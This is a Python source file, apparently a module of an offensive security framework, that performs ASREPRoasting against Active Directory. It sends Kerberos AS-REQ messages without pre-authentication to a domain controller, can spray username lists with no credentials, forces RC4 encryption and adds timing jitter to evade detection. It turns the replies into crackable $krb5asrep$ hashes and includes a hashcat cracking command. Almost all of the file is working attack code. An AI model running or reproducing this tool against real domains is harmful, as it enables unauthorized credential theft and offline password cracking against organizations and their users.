from __future__ import annotations
import asyncio
"""
ASREPRoasting — impacket.krb5.kerberosv5 low-level API (impacket >=0.11 compatible)
MITRE: T1558.004 — Works fully unauthenticated with username list.

3 input modes:
  1. AUTHENTICATED — have creds -> LDAP query for noPreauth accounts (precise)
  2. USERFILE      — have file   -> spray usernames from file (no creds needed)
  3. USERNAMES     — have list   -> spray usernames from params (no creds needed)

Fix Bug 1: Drop GetNPUsers (impacket example script, broken in >=0.11).
           Use getKerberosTGT with password=\'\' directly — unauthenticated AS-REQ.
Fix Bug 2: Implement all 3 modes. No credentials required for userfile/usernames.
Fix Bug 3: Per-request jitter via noise.jitter.sleep(), not post-hoc batch sleep.
"""
from typing import Any
from ares.core.logger import get_logger

logger = get_logger("ares.modules.ad.asreproast")
from ares.core.campaign import Finding, Severity
from ares.core.security import sanitize_hostname, sanitize_ldap
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module
from ares.core.errors import ModuleValidationError
from ares.modules.ad.dependencies import ensure_ad_dependencies


def _capture_asrep_raw(dc: str, domain: str, username: str) -> bytes | None:
    """
    Issue #4 fix: Send AS-REQ without pre-auth via raw sendReceive and return
    the raw wire bytes of the AS-REP.

    getKerberosTGT() parses the AS-REP internally so its return value cannot be
    used for hash extraction. sendReceive() gives us the raw bytes that
    _format_krb5asrep_hash() can parse into $krb5asrep$ format.

    Returns raw AS-REP bytes if account is ASREPRoastable, None otherwise.
    """
    try:
        from impacket.krb5.asn1 import AS_REQ, seq_set
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal, KerberosTime
        from impacket.krb5.kerberosv5 import sendReceive
        from pyasn1.codec.ber import encoder
        from pyasn1.type.univ import noValue
        import datetime, os

        client = Principal(username,
                           type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        krb_as_req = AS_REQ()

        req_body = krb_as_req["req-body"]
        req_body["kdc-options"] = constants.encodeFlags([])
        seq_set(req_body, "cname", client.components_to_asn1)
        req_body["realm"] = domain.upper()

        server_name = Principal(
            f"krbtgt/{domain.upper()}",
            type=constants.PrincipalNameType.NT_SRV_INST.value,
        )
        seq_set(req_body, "sname", server_name.components_to_asn1)

        now = datetime.datetime.now(datetime.timezone.utc)
        req_body["from"]  = KerberosTime.to_asn1(now)
        req_body["till"]  = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
        req_body["rtime"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
        req_body["nonce"] = int.from_bytes(os.urandom(4), "big")
        req_body["etype"][0] = constants.EncryptionTypes.rc4_hmac.value   # RC4 = fastest crack

        krb_as_req["pvno"]     = 5
        krb_as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)
        # No padata — no pre-auth. If account has DONT_REQUIRE_PREAUTH, KDC responds with AS-REP.

        raw_rep = sendReceive(encoder.encode(krb_as_req), domain.upper(), dc)
        return raw_rep

    except Exception as exc:
        msg = str(exc).upper()
        if "KDC_ERR_PREAUTH_REQUIRED" in msg or "PREAUTH_REQUIRED" in msg:
            return None   # account exists, preauth required → not vulnerable
        if "KDC_ERR_C_PRINCIPAL_UNKNOWN" in msg or "PRINCIPAL_UNKNOWN" in msg:
            return None   # username not in domain
        if "KDC_ERR_CLIENT_REVOKED" in msg or "CLIENT_REVOKED" in msg:
            return None   # account disabled
        raise


def _format_krb5asrep_hash(raw_asrep: bytes, username: str, domain: str) -> str:
    """
    Parse raw AS-REP wire bytes and format as $krb5asrep$ for hashcat mode 18200.

    enc-part layout (RC4 / etype 23):
        bytes  0–15 : HMAC-MD5 checksum
        bytes 16+   : ciphertext
    hashcat: $krb5asrep$etype$user@DOMAIN:checksum$ciphertext
    """
    try:
        from impacket.krb5.asn1 import AS_REP
        from pyasn1.codec.ber import decoder

        rep, _   = decoder.decode(raw_asrep, asn1Spec=AS_REP())
        enc      = rep["enc-part"]
        etype    = int(enc["etype"])
        cipher   = bytes(enc["cipher"])

        if len(cipher) < 16:
            return ""

        checksum   = cipher[:16].hex()
        ciphertext = cipher[16:].hex()
        return (
            f"$krb5asrep${etype}${username}@{domain.upper()}"
            f":{checksum}${ciphertext}"
        )
    except Exception:
        return ""


class ASREPRoastModule(BaseModule):
    """
    ad.asreproast — Capture AS-REP hashes from accounts without Kerberos pre-auth

    OPSEC: LOW
    MITRE: "T1558.004"
    OUTPUTS:  "asrep_hashes"
    """
    MODULE_ID          = "ad.asreproast"
    MODULE_NAME        = "ASREPRoasting"
    MODULE_CATEGORY    = "ad"
    MODULE_DESCRIPTION = "Capture AS-REP hashes from accounts without Kerberos pre-auth"
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.LOW
    REQUIRES           = []
    OUTPUTS            = ["asrep_hashes"]
    MITRE_TECHNIQUES   = ["T1558.004"]

    async def validate(self, ctx: "Any") -> None:
        """Validate: dc + domain + at least one input mode present."""
        from ares.core.context import ExecutionContext
        if not isinstance(ctx, ExecutionContext):
            return
        dc     = ctx.params.get("dc") or ctx.target
        domain = ctx.params.get("domain") or ctx.domain
        if not dc:
            raise ModuleValidationError(
                "ad.asreproast requires \'dc\' (Domain Controller IP)",
                module_id=self.MODULE_ID, field="dc",
            )
        if not domain:
            raise ModuleValidationError(
                "ad.asreproast requires \'domain\' (e.g. corp.local)",
                module_id=self.MODULE_ID, field="domain",
            )
        ad        = self._extract_ad_params(ctx)
        has_creds = bool(ad["username"]) and bool(ad["password"])
        has_file  = bool(ctx.params.get("userfile"))
        has_list  = bool(ctx.params.get("usernames"))
        if not has_creds and not has_file and not has_list:
            raise ModuleValidationError(
                "ad.asreproast requires one of: domain credentials (username+password), "
                "\'userfile\' param (path to username list), or "
                "\'usernames\' param (inline list).",
                module_id=self.MODULE_ID, field="usernames",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+)."""
        from ares.modules.base import ModuleResult
        ad = self._extract_ad_params(ctx)
        dc, domain, username, password = ad["dc"], ad["domain"], ad["username"], ad["password"]
        userfile  = ctx.params.get("userfile")
        usernames = ctx.params.get("usernames", [])
        if getattr(ctx, "dry_run", False):
            return ModuleResult(
                status="dry_run", module_id=self.MODULE_ID,
                raw={"dry_run": True, "dc": dc, "domain": domain},
            )
        findings, raw = await self.run(
            dc=dc, username=username, password=password,
            domain=domain, userfile=userfile, usernames=usernames,
        )
        return ModuleResult(
            status="success" if (findings or raw) else "partial",
            findings=findings, raw=raw,
            module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("ad.asreproast")
    async def run(self, dc, domain, username=None, password=None,
                  userfile=None, usernames=None, **kwargs):
        ensure_ad_dependencies(
            ("impacket", "pyasn1", "pyasn1_modules"),
            module_id=self.MODULE_ID,
        )
        dc, domain = sanitize_hostname(dc), sanitize_ldap(domain)
        if username:
            username = sanitize_ldap(username)
        await self.before_request(dc, "kerberos_tgs")

        has_creds = bool(username) and bool(password)
        has_file  = bool(userfile)

        if has_creds:
            mode = "authenticated"
        elif has_file:
            mode = "userfile"
        else:
            mode = "usernames"

        logger.info("asreproast_start", dc=dc, domain=domain, mode=mode)

        try:
            hashes, accounts = await self._get_asrep_hashes(
                dc, domain, username, password, userfile, usernames or [], mode
            )
        except ModuleValidationError:
            raise
        except Exception as exc:
            from ares.core.errors import NetworkError
            raise NetworkError(f"ASREPRoast failed: {exc}") from exc

        raw = {"asrep_hashes": hashes, "vulnerable_accounts": accounts, "mode": mode}
        self._analyze(raw)
        return self._findings, raw

    async def _get_asrep_hashes(
        self, dc, domain, username, password, userfile, usernames, mode
    ):
        """
        Low-level impacket implementation — no wrapper scripts.

        For unauthenticated AS-REQ: send getKerberosTGT with password=''.
          KDC_ERR_PREAUTH_REQUIRED  -> account exists, NOT vulnerable
          KDC_ERR_C_PRINCIPAL_UNKNOWN -> username does not exist
          Success (returns AS-REP)  -> account IS vulnerable, hash captured
        """
        ensure_ad_dependencies(
            ("impacket", "pyasn1", "pyasn1_modules"),
            module_id=self.MODULE_ID,
        )
        from impacket.krb5.kerberosv5 import getKerberosTGT
        from impacket.krb5.types import Principal
        from impacket.krb5 import constants

        # Build target list
        targets: list[str] = []
        if mode == "authenticated":
            targets = await self._ldap_get_nopreauth(dc, domain, username, password)
            logger.info("asreproast_ldap_targets", count=len(targets))
        elif mode == "userfile":
            try:
                with open(userfile, "r", errors="replace") as fh:
                    targets = [ln.strip() for ln in fh if ln.strip()]
            except OSError as exc:
                raise ValueError(f"Cannot read userfile {userfile!r}: {exc}") from exc
        else:
            targets = list(usernames)

        if not targets:
            return [], []

        loop     = asyncio.get_running_loop()
        hashes:   list[str] = []
        accounts: list[str] = []

        for i, uname in enumerate(targets):
            uname = uname.strip()
            if not uname:
                continue

            def _try_asreq(u=uname):
                """
                Issue #4 fix: use sendReceive directly to capture raw AS-REP wire bytes.
                getKerberosTGT() parses the response before returning — tgt[0] is
                a parsed TGT object, not raw AS-REP bytes. _format_krb5asrep_hash()
                needs raw bytes to extract enc-part for hashcat.
                """
                try:
                    return _capture_asrep_raw(dc, domain, u)
                except Exception as exc:
                    logger.debug("asreproast_request_error",
                                 username=u, error=str(exc)[:80])
                    return None

            raw_asrep = await loop.run_in_executor(None, _try_asreq)
            if raw_asrep is not None:
                hash_str = _format_krb5asrep_hash(raw_asrep, uname, domain)
                if hash_str:
                    hashes.append(hash_str)
                    accounts.append(uname)
                    logger.info("asreproast_hash_captured", username=uname)

            # per-request jitter
            if i < len(targets) - 1:
                await self.noise.jitter.sleep()

        return hashes, accounts

    async def _ldap_get_nopreauth(self, dc, domain, username, password):
        """Query LDAP for accounts with DONT_REQUIRE_PREAUTH enabled."""
        ensure_ad_dependencies(("ldap3",), module_id=self.MODULE_ID)
        import ssl
        import ldap3
        from ldap3 import Server, Connection, NTLM, SUBTREE, Tls, ALL
        from ldap3.core.exceptions import LDAPBindError

        conn = None
        for port, use_ssl in [(636, True), (389, False)]:
            try:
                tls_arg = Tls(validate=ssl.CERT_NONE) if use_ssl else None
                server  = Server(dc, port=port, use_ssl=use_ssl,
                                 tls=tls_arg, get_info=ALL, connect_timeout=10)
                conn = Connection(
                    server,
                    user=f"{domain.upper()}\\{username}",
                    password=password,
                    authentication=NTLM,
                    auto_bind=ldap3.AUTO_BIND_NONE,
                    receive_timeout=30,
                )
                if not conn.bind():
                    raise LDAPBindError(f"Bind failed: {conn.result}")
                break
            except Exception as exc:
                logger.debug("asreproast_ldap_bind_failed",
                             port=port, error=str(exc)[:80])
                conn = None

        if conn is None:
            raise ConnectionError(f"LDAP bind failed on {dc}")

        base = ",".join(f"DC={p}" for p in domain.upper().split("."))
        # UAC bit 0x400000 = DONT_REQUIRE_PREAUTH, bit 0x2 = ACCOUNTDISABLE
        nopreauth_filter = (
            "(&(objectClass=user)(objectCategory=person)"
            "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
            "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
        )
        targets: list[str] = []
        cookie: bool | bytes = True
        while cookie:
            conn.search(
                base, nopreauth_filter,
                search_scope=SUBTREE,
                paged_size=200,
                paged_cookie=None if cookie is True else cookie,
                attributes=["sAMAccountName"],
            )
            for e in conn.entries:
                targets.append(str(e.sAMAccountName))
            cookie = (
                conn.result.get("controls", {})
                    .get("1.2.840.113556.1.4.319", {})
                    .get("value", {})
                    .get("cookie")
            )
        conn.unbind()
        return targets

    def _analyze(self, raw):
        hashes   = raw.get("asrep_hashes", [])
        accounts = raw.get("vulnerable_accounts", [])
        if not hashes:
            return
        self.finding(
            title       = f"ASREPRoast Hashes Captured ({len(hashes)})",
            description = (
                f"Captured {len(hashes)} AS-REP hashes — crackable offline without "
                "domain credentials. hashcat mode 18200."
            ),
            severity        = Severity.HIGH,
            mitre_technique = "T1558.004",
            mitre_tactic    = "Credential Access",
            evidence        = {
                "accounts":     accounts[:10],
                "hash_count":   len(hashes),
                "hashcat_mode": 18200,
                "hashcat_cmd":  "hashcat -m 18200 hashes.txt rockyou.txt",
                "sample_hash":  hashes[0][:80] + "..." if hashes else "",
            },
            remediation = "Enable Kerberos pre-authentication on ALL accounts.",
            host        = "",
        )
